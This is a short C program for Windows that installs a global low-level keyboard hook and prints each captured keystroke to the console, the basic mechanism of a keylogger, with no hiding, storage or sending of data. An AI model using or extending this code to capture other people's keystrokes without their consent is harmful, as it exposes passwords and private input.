#include <stdio.h>
#include <windows.h>

LRESULT CALLBACK hook_proc(
    int code,
    WPARAM wParam,
    LPARAM lParam
)
{
    if(code >= 0)
    {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)lParam;
        char key = (char)MapVirtualKeyA(kb->vkCode, MAPVK_VK_TO_CHAR);
        printf("%c\n", key);
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}


int main()
{
    HHOOK hook;

    hook = SetWindowsHookExA(
        WH_KEYBOARD_LL,
        hook_proc,
        NULL,
        0
    );

    if(hook == NULL)
    {
        printf("Failed to install hook\n");
        return 1;
    }

    MSG msg;

    while(GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);

    return 0;
}